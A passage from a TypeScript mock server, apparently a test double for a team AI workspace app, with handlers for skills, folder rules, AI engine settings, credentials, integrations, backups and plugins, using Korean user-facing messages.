      this.putFile(file, `---\nname: ${JSON.stringify(c.body.name)}\ndescription: ${JSON.stringify(c.body.description ?? '')}\n---\n${c.body.content}`)
      Object.assign(s!, { status: 'approved', reviewer: { id: c.user.id, name: c.user.name }, reviewedAt: now(), resultPath: file, targetFolder: c.body.targetFolder, name: c.body.name, description: c.body.description, content: c.body.content })
      this.skillChange({ id: uuidv7(), at: now(), actor: { id: c.user.id, name: c.user.name }, path: file, change: 'create', from: null, byAi: false, kind: 'skill' })
      this.publish({ type: 'notice', data: { level: 'info', code: 'skill_suggestion_reviewed', message: `제안한 스킬이 등록됐어요: ${s!.name} (${file})`, link: `/skills?mine=${s!.id}` } })
      return this.suggestionFor(s!, c.user)
    },
    rejectSkillSuggestion: (c) => {
      const s = this.suggestions.find((x) => x.id === c.params.id)
      if (!s || !(s.suggester.id === c.user.id || this.manages(c.user, s.targetFolder))) fail('not_found', 404)
      if (!this.manages(c.user, s!.targetFolder)) fail('forbidden', 403)
      if (s!.status !== 'pending') fail('conflict', 409)
      Object.assign(s!, { status: 'rejected', reviewer: { id: c.user.id, name: c.user.name }, reviewedAt: now(), reviewNote: c.body.note || null })
      this.publish({ type: 'notice', data: { level: 'info', code: 'skill_suggestion_reviewed', message: `제안한 스킬이 거절됐어요: ${s!.name}`, link: `/skills?mine=${s!.id}` } })
      return this.suggestionFor(s!, c.user)
    },
    createFolder: (c) => {
      const f: Folder = { id: uuidv7(), path: c.body.path, exists: true, createdAt: now(), rules: [] }
      f.rules = (c.body.rules ?? []).map((r: Json) => ({ id: uuidv7(), folderId: f.id, subjectType: r.subjectType, subjectId: r.subjectId ?? null, access: r.access, updatedBy: { id: c.user.id, name: c.user.name }, updatedAt: now() }))
      this.folders.push(f)
      return { status: 201, body: f }
    },
    putFolderRules: (c) => {
      const f = this.folders.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      f.rules = c.body.rules.map((r: Json) => ({ id: uuidv7(), folderId: f.id, subjectType: r.subjectType, subjectId: r.subjectId ?? null, access: r.access, updatedBy: { id: c.user.id, name: c.user.name }, updatedAt: now() }))
      return f
    },
    deleteFolder: (c) => {
      this.folders = this.folders.filter((f) => f.id !== c.params.id)
      return undefined
    },
    previewRules: (c) => ({
      folders: c.body.changes.map((ch: Json) => ({ path: ch.path, users: this.users.map((u) => ({ user: { id: u.id, name: u.name }, role: u.role, before: u.role === 'owner' ? 'write' : 'none', after: u.role === 'owner' ? 'write' : (ch.rules as Json[]).some((r) => r.subjectType === 'everyone') ? 'read' : 'none' })) })),
      losing: [{ user: { id: 'bob', name: 'Bob' }, paths: [c.body.changes[0].path], chatsReset: 2 }],
    }),
    engines: () => this.enginesResponse(),
    updateEngines: (c) => {
      if (c.body.defaultEngine) this.settings.defaultEngine = c.body.defaultEngine
      if (c.body.concurrency) this.settings.concurrency = c.body.concurrency
      if (c.body.enabled?.codex !== undefined) this.codexEnabled = c.body.enabled.codex
      if (c.body.limitFallback === true && !this.codexEnabled) fail('conflict', 409, 'Codex가 꺼져 있어 한도 대체를 켤 수 없습니다.')
      if (c.body.limitFallback !== undefined) this.limitFallback = c.body.limitFallback
      if (!this.codexEnabled) this.limitFallback = false
      if (c.body.memberChoice) this.memberChoice = c.body.memberChoice
      this.publish({ type: 'notice', data: { level: 'info', code: 'engine_choice_changed', message: '' } })
      return this.enginesResponse()
    },
    checkEngine: (c) => this.enginesResponse().engines.find((e) => e.id === c.params.id) ?? fail('not_found', 404),
    // the team's API engine: not set up (like a fresh server)
    getApiEngine: () => ({ baseUrl: null, model: null, label: null, hasKey: false }),
    putApiEngine: (c) => ({ baseUrl: c.body.baseUrl, model: c.body.model, label: c.body.label ?? null, hasKey: !!c.body.key }),
    listBudgets: () => ({ items: this.budgets }),
    createBudget: (c) => {
      const b: Budget = { id: uuidv7(), subjectType: c.body.subjectType, subjectId: c.body.subjectId, period: c.body.period, limitUsd: c.body.limitUsd, limitTokens: c.body.limitTokens ?? null, action: c.body.action, usedUsd: 0, usedTokens: 1234 }
      this.budgets.push(b)
      return { status: 201, body: b }
    },
    updateBudget: (c) => Object.assign(this.budgets.find((b) => b.id === c.params.id) ?? fail('not_found', 404), c.body),
    deleteBudget: (c) => {
      this.budgets = this.budgets.filter((b) => b.id !== c.params.id)
      return undefined
    },
    settings: () => this.settings,
    speechKey: () => this.speechKey,
    setSpeechKey: (c) => {
      this.speechKey = c.body.sealed ? { set: true, hint: 'mock', updatedAt: now() } : { set: false, hint: null, updatedAt: null }
      return this.speechKey
    },
    updateSettings: (c) => {
      const before = this.settings.defaultLocale
      const policyBefore = this.settings.browserAllowAll
      Object.assign(this.settings, c.body)
      this.syncLocales()
      if (this.settings.defaultLocale !== before) this.publish(LOCALE_CHANGED)
      if (this.settings.browserAllowAll !== policyBefore) this.publish(BROWSER_POLICY_CHANGED)
      return this.settings
    },
    // like server/src/admin/team-icon.ts: the same checks (shared/src/team-icon.ts) and words
    putTeamIcon: async (c) => {
      const bytes = new Uint8Array(await c.req.arrayBuffer())
      const r = bytes.byteLength > TEAM_ICON_MAX_BYTES ? ({ ok: false, problem: 'too_big' } as const) : checkTeamIcon(bytes, c.query.type)
      if (!r.ok) {
        const message = TEAM_ICON_TEXT[r.problem].ko
        if (r.problem === 'too_big') fail('payload_too_large', 413, message)
        throw new Fail('validation', 400, message, { body: r.problem }, { reason: r.problem })
      }
      this.teamIcon = { bytes, type: r.type, width: r.width, height: r.height, version: sha256Hex(bytes).slice(0, 16) }
      this.publish(TEAM_ICON_CHANGED)
      return { version: this.teamIcon.version, type: r.type, width: r.width, height: r.height, size: bytes.byteLength }
    },
    deleteTeamIcon: () => {
      if (this.teamIcon) this.publish(TEAM_ICON_CHANGED)
      this.teamIcon = null
      return undefined
    },
    usage: (c) => ({ from: c.query.from ?? now(), to: c.query.to ?? now(), rows: c.query.groupBy === 'skill'
      ? [{ key: 'skills/report.md', label: '주간 보고서', turns: 12, inputTokens: 12000, outputTokens: 3400, costUsd: 0.42 }]
      : c.query.groupBy === 'model'
        ? [{ key: 'model-test', label: 'model-test', turns: 15, inputTokens: 14000, outputTokens: 4100, costUsd: 0.47 }]
        : [{ key: 'olga', label: 'Olga', turns: 12, inputTokens: 12000, outputTokens: 3400, costUsd: 0.42 }, { key: 'bob', label: 'Bob', turns: 3, inputTokens: 2000, outputTokens: 700, costUsd: 0.05 }],
      totals: { turns: 15, inputTokens: 14000, outputTokens: 4100, costUsd: 0.47 } }),
    audit: () => ({ items: [{ id: 'a1', source: 'admin', at: now(), actor: { id: 'olga', name: 'Olga' }, action: 'invite.create', target: 'member', turnId: null, detail: { role: 'member' } } satisfies AuditEntry], nextCursor: null }),
    diagnostics: () => ({ version: this.serverVersion, host: { os: 'darwin', arch: 'arm64', hostname: 'mac-mini' }, disk: { teamFolderFreeBytes: 500e9, dataFreeBytes: 500e9 }, queue: { running: 0, queued: 0, concurrency: 2 }, checks: [{ id: 'relay', group: 'relay', label: 'Relay connection', status: 'warn', detail: 'Relay not configured (dev)' }, { id: 'disk', group: 'disk', label: 'Disk space', status: 'ok', detail: null }], generatedAt: now() }),
    updateStatus: () => ({ current: this.serverVersion, channel: 'stable', available: null, lastCheckedAt: now(), previous: null, managed: this.cloud }),
    // like server/src/system/storage.ts: a 50 GB disk, 41 GB used (over 80%); the plan on Team AX Cloud
    storage: () => ({
      totalBytes: 50 * 1024 ** 3, usedBytes: 41 * 1024 ** 3, freeBytes: 9 * 1024 ** 3, percent: 82, level: 'warn', reserveBytes: 1024 ** 3, writesRefused: false,
      breakdown: { team: 30 * 1024 ** 3, history: 4 * 1024 ** 3, trash: 3 * 1024 ** 3, backups: 2 * 1024 ** 3, models: 0.5 * 1024 ** 3, data: 0.3 * 1024 ** 3, app: 0.2 * 1024 ** 3, other: 1024 ** 3 },
      measuredAt: now(), planDiskGiB: this.cloud ? 50 : null,
    }),
    // like server/src/system/managed.ts: the plan card and the operator's notices on Team AX Cloud (none self-hosted)
    plan: (c) => ({
      plan: this.cloud ? {
        id: 'team', name: ({ ko: '팀', en: 'Team', id: 'Tim', ja: 'チーム', es: 'Equipo' } as Record<string, string>)[c.user.locale ?? 'ko'] ?? 'Team', maxConcurrency: 3, concurrency: Math.min(3, this.settings.concurrency),
        maxActiveMembers: 12, activeMembers: this.users.filter((u) => u.status === 'active').length, diskGiB: 50, memoryMiB: 4096, cpuCores: 3,
        localBackupRetentionDays: 3, links: { account: 'https://app.teamax.example/billing', status: 'https://status.teamax.example', support: 'support@teamax.example' },
        updatedAt: now(),
      } : null,
    }),
    managedNotices: (c) => ({
      items: !this.cloud ? [] : [
        ...(c.user.role === 'owner' ? [{ id: 'grant-1', level: 'critical' as const, text: '지원팀이 11월 6일 18시까지 진단 접근 권한을 가지고 있어요', link: null, until: null, dismissible: false }] : []),
        { id: 'maint-1', level: 'info' as const, text: '오늘 밤 2시에 점검이 있어요', link: 'https://status.teamax.example', until: null, dismissible: true },
      ],
    }),
    listBackups: () => ({ items: [{ id: 'b1', kind: 'daily', createdAt: now(), size: 123456, scope: 'full' }] }),
    startBackup: (c) => {
      const id = uuidv7()
      const job: Job = { id, kind: 'backup', status: 'running', progress: 0, message: 'Backing up', result: null, error: null, createdAt: now(), finishedAt: null }
      this.jobs.set(id, job)
      setTimeout(() => this.publish({ type: 'job.progress', data: { jobId: id, kind: 'backup', progress: 0.5, message: 'Copying database' } }), 50)
      setTimeout(() => {
        Object.assign(job, { status: 'done', progress: 1, result: { backupId: 'b2', size: 999, createdAt: now() }, finishedAt: now() })
        this.publish({ type: 'job.done', data: { job } })
      }, 200)
      void c
      return { status: 202, body: { jobId: id } }
    },
    connection: () => this.connection,
    updateConnection: (c) => {
      if (c.body.password !== OWNER_PASSWORD) fail('forbidden', 403)
      if (!(this.connection.availableModes ?? []).includes(c.body.mode)) fail('conflict', 409, 'This connection mode is not available in this version yet.')
      if (c.body.mode !== 'direct-only' && !(c.body.teamName ?? this.connection.teamName)) fail('validation', 400)
      this.connection = { ...this.connection, mode: c.body.mode, teamName: c.body.teamName ?? this.connection.teamName, state: c.body.mode === 'direct-only' ? 'disabled' : 'connecting', detail: 'Applies after the server restarts.' }
      return this.connection
    },
    // like a server outside office mode (no automatic office updates)
    officeUpdateStatus: () => null,
    officeUpdateAction: () => fail('conflict', 409, '사무실 모드가 아니라 자동 업데이트가 없습니다.'),
    // ---------------- AI connections (like server/src/routes/credentials.ts) ----------------
    listCredentials: () => ({ items: this.credentials.map((c) => this.credentialView(c)), memberOwn: this.credMemberOwn, sharedSubscriptions: this.credSharedSubscriptions, allowedKinds: ['anthropic-oauth', 'anthropic-api-key', 'chatgpt', 'openai-api-key'], pricesAsOf: '2026-10-22' }),
    sealingKey: () => this.sealer.publicKey(),
    createCredential: async (c) => {
      if (c.body.password !== OWNER_PASSWORD) fail('forbidden', 403, '비밀번호가 맞지 않아요.', { 'body.password': 'wrong password' })
      return { status: 201, body: await this.addCredential(c.user, c.body, false) }
    },
    createMyCredential: async (c) => {
      if (!this.credMemberOwn) fail('forbidden', 403)
      return { status: 201, body: await this.addCredential(c.user, c.body, true) }
    },
    updateCredential: (c) => {
      const x = this.credentials.find((y) => y.id === c.params.id) ?? fail('not_found', 404)
      if (c.body.label !== undefined) x.label = c.body.label
      if (c.body.priority !== undefined) x.priority = c.body.priority
      if (c.body.disabled !== undefined) { x.disabled = c.body.disabled; x.state = x.disabled ? 'disabled' : 'ok' }
      if (c.body.assignments) x.assignments = c.body.assignments.map((a: { subjectType: 'group' | 'user'; subjectId: string }) => ({ ...a, name: a.subjectType === 'group' ? this.groups.find((g) => g.id === a.subjectId)?.name ?? a.subjectId : this.users.find((u) => u.id === a.subjectId)?.name ?? a.subjectId }))
      if (c.body.spendLimit) x.spendLimit = c.body.spendLimit
      this.credentials.sort((a, b) => a.priority - b.priority)
      return x
    },
    replaceCredentialSecret: async (c) => {
      if (c.body.password !== OWNER_PASSWORD) fail('forbidden', 403)
      const x = this.credentials.find((y) => y.id === c.params.id) ?? fail('not_found', 404)
      await this.sealer.unseal(c.body.sealed, 'credential.replace').catch(() => fail('validation', 400))
      x.state = 'ok'; x.detail = null
      return x
    },
    deleteCredential: (c) => {
      if (!this.credentials.some((x) => x.id === c.params.id)) fail('not_found', 404)
      this.credentials = this.credentials.filter((x) => x.id !== c.params.id)
      return undefined
    },
    deleteMyCredential: (c) => {
      const x = this.credentials.find((y) => y.id === c.params.id && y.owner?.id === c.user.id) ?? fail('not_found', 404)
      this.credentials = this.credentials.filter((y) => y.id !== x.id)
      return undefined
    },
    checkCredential: (c) => {
      const x = this.credentials.find((y) => y.id === c.params.id) ?? fail('not_found', 404)
      if (x.state === 'unverified') { x.state = 'ok'; x.detail = null; x.checkedAt = now() }
      return x
    },
    updateCredentialSettings: (c) => {
      if (c.body.sharedSubscriptions === true && !this.credSharedSubscriptions && c.body.acknowledgedSharedSubscriptionRisk !== true) fail('validation', 400)
      if (c.body.memberOwn !== undefined) this.credMemberOwn = c.body.memberOwn
      if (c.body.sharedSubscriptions !== undefined) this.credSharedSubscriptions = c.body.sharedSubscriptions
      return { memberOwn: this.credMemberOwn, sharedSubscriptions: this.credSharedSubscriptions }
    },
    myCredentials: (c) => ({ allowed: this.credMemberOwn, allowedKinds: ['anthropic-oauth', 'anthropic-api-key', 'chatgpt', 'openai-api-key'], items: this.credentials.filter((x) => x.owner?.id === c.user.id) }),
    startCredentialLogin: (c) => {
      if (!this.credSharedSubscriptions) fail('forbidden', 403)
      if (c.body.password !== OWNER_PASSWORD) fail('forbidden', 403)
      return { status: 202, body: this.startLogin(c.user, c.body.label, false, c.body.reconnectId) }
    },
    startMyCredentialLogin: (c) => {
      if (!this.credMemberOwn) fail('forbidden', 403)
      return { status: 202, body: this.startLogin(c.user, c.body.label, true) }
    },
    getCredentialLogin: (c) => this.loginOf(c.params.id, c.user),
    getMyCredentialLogin: (c) => this.loginOf(c.params.id, c.user),
    cancelCredentialLogin: (c) => { this.cancelLogin(c.params.id, c.user); return undefined },
    cancelMyCredentialLogin: (c) => { this.cancelLogin(c.params.id, c.user); return undefined },

    // ---------------- external services (like server/src/routes/integrations.ts) ----------------
    listIntegrations: (c) => ({
      items: this.integrations.filter((x) => this.integrationAllows(x, c.user)).map((x) => this.integrationView(x, c.user)),
      personalAllowed: this.settings.personalIntegrations,
    }),
    createIntegration: (c) => {
      if (!this.settings.personalIntegrations) fail('forbidden', 403, '팀에서 개인 연결을 꺼 두었어요.')
      if (c.body.access) fail('validation', 400, '사용할 사람은 팀 연결에만 정해요.', { 'body.access': 'team connections only' })
      return { status: 201, body: this.addIntegration(c.user, c.body, 'personal') }
    },
    updateIntegration: (c) => this.patchIntegration(c.user, c.params.id, c.body),
    deleteIntegration: (c) => {
      const x = this.manageableIntegration(c.user, c.params.id)
      this.integrations = this.integrations.filter((y) => y.id !== x.id)
      this.integrationSecrets.delete(x.id)
      return undefined
    },
    refreshIntegration: (c) => {
      const x = this.manageableIntegration(c.user, c.params.id)
      this.checkIntegration(x)
      x.updatedAt = now()
      return this.integrationView(x, c.user)
    },
    authorizeIntegration: (c) => {
      const x = this.manageableIntegration(c.user, c.params.id)
      if (x.kind !== 'mcp' || x.auth !== 'oauth') fail('conflict', 409, '이 연결은 로그인을 쓰지 않아요.')
      const flow: IntegrationFlow = { flowId: uuidv7(), state: 'pending', expiresAt: new Date(Date.now() + 10 * 60_000).toISOString(), reason: null }
      this.integrationFlows.set(flow.flowId, { flow, integrationId: x.id, userId: c.user.id, polls: 0 })
      return { flowId: flow.flowId, authorizationUrl: `https://auth.example.test/authorize?client_id=mock&state=${flow.flowId}`, expiresAt: flow.expiresAt }
    },
    integrationFlow: (c) => {
      const f = this.integrationFlows.get(c.params.id)
      if (!f || f.userId !== c.user.id) return fail('not_found', 404)
      // the person finishes at the service by the second poll: the server has the tokens and checks the connection
      if (f.flow.state === 'pending' && ++f.polls >= 2) {
        const x = this.integrations.find((y) => y.id === f.integrationId)
        if (!x) Object.assign(f.flow, { state: 'failed', reason: '연결이 지워졌어요.' })
        else {
          this.integrationSecrets.set(x.id, 'oauth-tokens')
          x.account = `${c.user.username}@example.test`
          this.checkIntegration(x)
          f.flow.state = 'completed'
        }
      }
      return f.flow
    },
    listTeamIntegrations: (c) => ({ items: this.integrations.filter((x) => x.scope === 'team').map((x) => this.integrationView(x, c.user)) }),

    // Admin > Plugins (web/test/mock/plugins.ts)
    listPlugins: (c) => this.plugins.list(c.user.locale ?? 'ko', this.settings.defaultLocale),
    inspectPluginFile: (c) => {
      const r = this.plugins.inspectFile(c.file!.name, c.user.id, c.user.locale ?? 'ko')
      if ('reason' in r) throw new Fail('validation', 400, undefined, undefined, { reason: r.reason })
      return r
    },
    inspectPluginSource: (c) => {
      const r = c.body.source === 'catalog' ? this.plugins.inspectCatalog(c.body.id, c.user.id, c.user.locale ?? 'ko') : { reason: 'import_missing' }
      if ('reason' in r) throw new Fail('conflict', 409, undefined, undefined, { reason: r.reason })
      return r
    },
    installPlugin: (c) => {
      const r = this.plugins.install(c.body.token, c.body.manifestSha256, c.body.enable, { id: c.user.id, name: c.user.name })
      if ('reason' in r) throw new Fail(r.status === 410 ? 'gone' : 'conflict', r.status, undefined, undefined, { reason: r.reason })
      return { status: 201, body: r }
    },
    enablePlugin: (c) => this.plugins.set(c.params.id, true) ?? fail('not_found', 404),
    disablePlugin: (c) => this.plugins.set(c.params.id, false) ?? fail('not_found', 404),
    rollbackPlugin: () => { throw new Fail('conflict', 409, undefined, undefined, { reason: 'no_rollback' }) },
    uninstallPlugin: (c) => { if (!this.plugins.remove(c.params.id)) fail('not_found', 404); return undefined },
    createTeamIntegration: (c) => ({ status: 201, body: this.addIntegration(c.user, c.body, 'team') }),

    // nothing connected, no scheduled tasks yet
    listConnected: () => ({ items: [] }),
    listSchedules: () => ({ items: [], timeZone: 'Asia/Seoul' }),
    listScheduleTemplates: () => ({ items: [{ id: 'daily-file-index', version: 1, repeat: 'daily' }, { id: 'weekly-summary', version: 1, repeat: 'weekly' }], timeZone: 'Asia/Seoul' }),
    listNotifications: () => ({ items: [], nextCursor: null, unreadCount: 0 }),
    getNotificationPreferences: () => ({ scheduleSuccess: true, scheduleFailure: true, connectionReconnect: true, skillSuggestions: true }),
    getPushSettings: () => ({ configured: false, enabled: false, publicKey: null, subscriptionId: null }),
    listRemoteConnectors: () => ({ configured: false, resource: null, items: [] }),
    connectInfo: () => ({ teamId: 'team-acme', lanCertSha256: null, lanPort: 8443, lanHosts: [], canonicalOrigin: null }),
  }

  // ---------------- AI connections ----------------
  credentialView(c: Credential): Credential {
    return !c.owner && !c.disabled && (c.kind === 'anthropic-oauth' || c.kind === 'chatgpt') && !this.credSharedSubscriptions
      ? { ...c, state: 'sharing_off', detail: 'Shared subscriptions are off.' } : c
  }
  async addCredential(user: User, body: { kind: CredentialKind; label: string; sealed: never; acknowledgedPlanNotice?: boolean; assignments?: { subjectType: 'group' | 'user'; subjectId: string }[] }, personal: boolean): Promise<Credential> {
    if (!personal && (body.kind === 'anthropic-oauth' || body.kind === 'chatgpt') && !this.credSharedSubscriptions) fail('forbidden', 403)
    const secret = await this.sealer.unseal(body.sealed, 'credential.create').catch(() => fail('validation', 400, '보낸 값을 열 수 없어요.'))
    const re = body.kind === 'anthropic-oauth' ? /^sk-ant-oat\d{2}-/ : body.kind === 'anthropic-api-key' ? /^sk-ant-api\d{2}-/ : /^sk-(?!ant-)/
    if (!re.test(secret)) fail('validation', 400, '이 종류의 토큰·키가 아니에요.', { 'body.sealed': 'not a token of this kind' })
    if (body.kind === 'anthropic-oauth' && body.acknowledgedPlanNotice !== true) fail('validation', 400, '구독 요금제 안내를 확인해 주세요.')
    const c = this.newCredential(user, body.kind, body.label, personal, secret.includes('unverified') ? 'unverified' : 'ok')
    c.assignments = (body.assignments ?? []).map((a) => ({ ...a, name: a.subjectType === 'group' ? this.groups.find((g) => g.id === a.subjectId)?.name ?? a.subjectId : this.users.find((u) => u.id === a.subjectId)?.name ?? a.subjectId }))
    if (body.kind.endsWith('api-key')) c.hint = secret.slice(-4)
    this.credentials.push(c)
    return c
  }
  newCredential(user: User, kind: CredentialKind, label: string, personal: boolean, state: Credential['state']): Credential {
    return {
      id: uuidv7(), kind, label, scope: personal ? 'personal' : 'team', owner: personal ? { id: user.id, name: user.name } : null, assignments: [],
      priority: (this.credentials.length + 1) * 10, disabled: false, state, detail: state === 'unverified' ? '첫 질문 때 확인돼요.' : null, hint: null, planType: kind === 'chatgpt' ? 'pro' : null,
      expiresAt: kind === 'anthropic-oauth' ? new Date(Date.now() + 365 * 86400_000).toISOString() : null, limitedUntil: null, checkedAt: state === 'ok' ? now() : null, lastUsedAt: null,
      spendLimit: { usd: null, tokens: null, action: 'block' }, month: { usd: 0, tokens: 0, requests: 0 }, createdAt: now(),
    }
  }
  /** a ChatGPT sign-in: the code after a moment, then the connection */
  startLogin(user: User, label: string, personal: boolean, reconnectId?: string): CredentialLogin {
    const loginId = 'login' + uuidv7().replace(/-/g, '')
    const l = { loginId, state: 'starting' as CredentialLogin['state'], url: null as string | null, code: null as string | null, expiresAt: new Date(Date.now() + 16 * 60_000).toISOString(), credential: null as Credential | null, reason: null as string | null, userId: user.id, personal, label }
    this.credLogins.set(loginId, l)
    const pub = () => { const { userId: _u, personal: _p, label: _l, ...data } = l; this.publish({ type: 'credential.login', data }) }
    setTimeout(() => { if (l.state !== 'starting') return; l.state = 'code'; l.url = 'https://auth.openai.com/codex/device'; l.code = 'WXYZ-12AB3'; pub() }, 150)
    setTimeout(() => {
      if (l.state !== 'code') return
      if (!(personal ? this.credMemberOwn : this.credSharedSubscriptions)) { l.state = 'failed'; l.reason = 'policy_changed'; pub(); return }
      if (reconnectId) { const x = this.credentials.find((y) => y.id === reconnectId); if (x) { x.state = 'ok'; x.detail = null; l.credential = x } }
      else { const c = this.newCredential(user, 'chatgpt', label, personal, 'ok'); this.credentials.push(c); l.credential = c }
      l.state = 'done'; pub()
    }, 1200)
    const { userId: _u, personal: _p, label: _l, ...data } = l
    return data
  }
  loginOf(id: string, user: User): CredentialLogin {
    const l = this.credLogins.get(id)
    if (!l || l.userId !== user.id) return fail('not_found', 404)
    const { userId: _u, personal: _p, label: _l, ...data } = l
    return data
  }
  cancelLogin(id: string, user: User) {
    const l = this.credLogins.get(id)
    if (!l || l.userId !== user.id) fail('not_found', 404)
    if (l!.state === 'starting' || l!.state === 'code') { l!.state = 'cancelled'; const { userId: _u, personal: _p, label: _l, ...data } = l!; this.publish({ type: 'credential.login', data }) }
  }

  // ---------------- external services ----------------
  integrationView(x: MockIntegration, u: User): Integration {
    const canManage = x.scope === 'personal' ? x.ownerId === u.id : u.role !== 'member'
    const { ownerId: _o, checks: _c, ...rest } = x
    return { ...rest, hasSecret: this.integrationSecrets.has(x.id), access: x.scope === 'team' && canManage ? x.access : null, canManage }
  }
  /** may use it in their chats: the owner of a personal one; the access rule of a team one (admins are not implied) */
  integrationAllows(x: MockIntegration, u: User): boolean {
    if (x.scope === 'personal') return x.ownerId === u.id
    const a = x.access ?? NO_ACCESS
    return a.everyone || a.users.includes(u.id) || a.groups.some((g) => u.groupIds.includes(g))
  }
  /** the owner of a personal connection, an admin for a team one; someone else's personal connection does not exist */
  manageableIntegration(u: User, id: string): MockIntegration {
    const x = this.integrations.find((y) => y.id === id)
    if (!x || (x.scope === 'personal' && x.ownerId !== u.id) || (x.scope === 'team' && u.role === 'member' && !this.integrationAllows(x, u))) return fail('not_found', 404)
    if (x.scope === 'team' && u.role === 'member') fail('forbidden', 403)
    return x
  }
  addIntegration(u: User, body: IntegrationInput, scope: 'personal' | 'team'): Integration {
    if (privateHost(new URL(body.url).hostname)) fail('validation', 400, '사내망이나 이 컴퓨터의 주소는 쓸 수 없어요.', { 'body.url': 'private or local address' })
    const siblings = this.integrations.filter((y) => (scope === 'team' ? y.scope === 'team' : y.ownerId === u.id))
    if (siblings.length >= (scope === 'team' ? 50 : 20)) fail('conflict', 409, '연결을 더 만들 수 없어요.')
    const base = body.slug ?? (body.name.toLowerCase().replace(/[^a-z0-9]/g, '').slice(0, 12) || 'conn')
    let slug = base
    for (let n = 2; siblings.some((y) => y.slug === slug); n++) slug = base.slice(0, 12 - String(n).length) + n
    const x: MockIntegration = {
      id: uuidv7(), scope, kind: body.kind, name: body.name, slug, url: body.url, auth: body.auth, authHeader: body.auth === 'header' ? body.authHeader ?? null : null,
      account: null, notes: body.kind === 'http' ? body.notes ?? null : null, writePolicy: body.writePolicy, status: 'needs_auth', lastError: null, tools: [], toolsUpdatedAt: null,
      access: scope === 'team' ? body.access ?? NO_ACCESS : null, createdBy: { id: u.id, name: u.name }, createdAt: now(), updatedAt: now(), lastUsedAt: null,
      ownerId: scope === 'personal' ? u.id : null, checks: 0,
    }
    if (body.secret && (body.auth === 'bearer' || body.auth === 'header')) this.integrationSecrets.set(x.id, body.secret)
    this.integrations.push(x)
    this.checkIntegration(x)
    return this.integrationView(x, u)
  }
  patchIntegration(u: User, id: string, b: IntegrationPatch): Integration {
    const x = this.manageableIntegration(u, id)
    if (b.access && x.scope !== 'team') fail('validation', 400, '사용할 사람은 팀 연결에만 정해요.', { 'body.access': 'team connections only' })
    const auth = b.auth ?? x.auth
    if (auth === 'oauth' && x.kind !== 'mcp') fail('validation', 400, undefined, { 'body.auth': 'sign-in (oauth) is for MCP servers' })
    const header = auth === 'header' ? (b.authHeader !== undefined ? b.authHeader : x.authHeader) : null
    if (auth === 'header' && !header) fail('validation', 400, undefined, { 'body.authHeader': 'give the header name' })
    const moved = (b.url !== undefined && b.url !== x.url) || auth !== x.auth
    if (b.url !== undefined && privateHost(new URL(b.url).hostname)) fail('validation', 400, '사내망이나 이 컴퓨터의 주소는 쓸 수 없어요.', { 'body.url': 'private or local address' })
    if (b.name !== undefined) x.name = b.name
    if (b.url !== undefined) x.url = b.url
    x.auth = auth
    x.authHeader = header
    if (b.notes !== undefined && x.kind === 'http') x.notes = b.notes
    if (b.writePolicy) x.writePolicy = b.writePolicy
    if (b.access) x.access = b.access
    // like the server: a stored key never follows a connection to another address or sign-in method
    if (moved || b.clearSecret) {
      this.integrationSecrets.delete(x.id)
      x.account = null
    }
    if (b.secret && (auth === 'bearer' || auth === 'header')) this.integrationSecrets.set(x.id, b.secret)
    if (moved) {
      x.tools = []
      x.toolsUpdatedAt = null
    }
    x.updatedAt = now()
    this.checkIntegration(x)
    return this.integrationView(x, u)
  }
  /** the connection check: a "down." host fails, a missing or refused key fails, sign-in is needed until done */
  checkIntegration(x: MockIntegration) {
    const keyed = x.auth === 'bearer' || x.auth === 'header'
    const secret = this.integrationSecrets.get(x.id)
    x.checks++
    const set = (status: Integration['status'], lastError: string | null) => Object.assign(x, { status, lastError })
    if (new URL(x.url).hostname.startsWith('down.')) set('error', '서비스가 응답하지 않아요(502). 잠시 뒤 다시 확인해 주세요.')
    else if (x.auth === 'oauth' && !secret) set('needs_auth', null)
    else if (keyed && !secret) set('error', '키가 없어요. 수정에서 키를 넣어 주세요.')
    else if (keyed && secret === 'wrong-key') set('error', '서비스가 키를 거절했어요(401). 키를 확인해 주세요.')
    else {
      set('connected', null)
      if (x.kind === 'mcp') {
        x.tools = FAKE_MCP_TOOLS.slice(0, x.checks > 1 ? 3 : 2)
        x.toolsUpdatedAt = now()
      }
    }
  }

  enginesResponse() {
    return {
      engines: [
        { id: 'claude-code' as const, label: 'Claude Code', enabled: true, authMode: 'local-login' as const, installed: true, version: '2.1.305', status: 'ok' as const, detail: null, models: [{ id: 'claude-sonnet', label: 'Sonnet' }, { id: 'claude-opus', label: 'Opus' }], checkedAt: now() },
        { id: 'codex' as const, label: 'Codex', enabled: this.codexEnabled, authMode: 'local-login' as const, installed: true, version: '0.163.0', status: 'not_logged_in' as const, detail: 'Run `codex login --device-auth` on the server Mac.', models: [], checkedAt: now() },
      ],
      defaultEngine: this.settings.defaultEngine,
      defaultModel: this.settings.defaultModel,
      concurrency: this.settings.concurrency, concurrencyMax: this.cloud ? 3 : 16,
      accounts: [],
      memberChoice: this.memberChoice,
      limitFallback: this.limitFallback,
      limitFallbackAvailable: this.codexEnabled,
    }
  }

  makeAttachment(chatId: string, name: string, data: Uint8Array, mime: string, user: User): Attachment {
    const a: Attachment & { data: Uint8Array } = { id: uuidv7(), name, path: `users/${user.id}/.attachments/${chatId}/${name}`, size: data.byteLength, mime: mime || 'application/octet-stream', kind: mime.startsWith('image/') ? 'image' : mime.startsWith('audio/') ? 'audio' : 'other', data }
    this.attachments.set(a.id, a)
    this.putFile(a.path, data)
    const { data: _d, ...out } = a
    return out
  }

  transcribeJob(user: User): string {
    const id = uuidv7()
    const job: Job = { id, kind: 'transcribe', status: 'running', progress: null, message: null, result: null, error: null, createdAt: now(), finishedAt: null }
    this.jobs.set(id, job)
    setTimeout(() => {
      Object.assign(job, { status: 'done', progress: 1, result: { text: '받아쓴 문장입니다', language: 'ko', durationSec: 2 }, finishedAt: now() })
      this.publish({ type: 'job.done', data: { job } })
    }, 150)
    void user
    return id
  }

  // ---------------- HTTP ----------------
  routes = listEndpoints().map(({ name, ep }) => ({ name, ep, re: new RegExp('^' + ep.path.replace(/:([A-Za-z_]+)/g, '(?<$1>[^/]+)') + '$') }))

  async handle(req: Request, dist: string): Promise<Response> {
    const url = new URL(req.url)
    const p = url.pathname
    if (p.startsWith('/__test/')) return this.testControl(p, req)
    if (!p.startsWith('/api/')) return pageHeaders(serveWeb(req, { dist, dev: false, devPort: 0, teamIcon: () => this.teamIcon }) ?? new Response('no', { status: 404 }))
    this.log.push(`${req.method} ${p}`)
    const route = this.routes.find((r) => r.ep.method === req.method && r.re.test(p))
    try {
      if (!route) return fail('not_found', 404)
      const h = this.handlers[route.name]
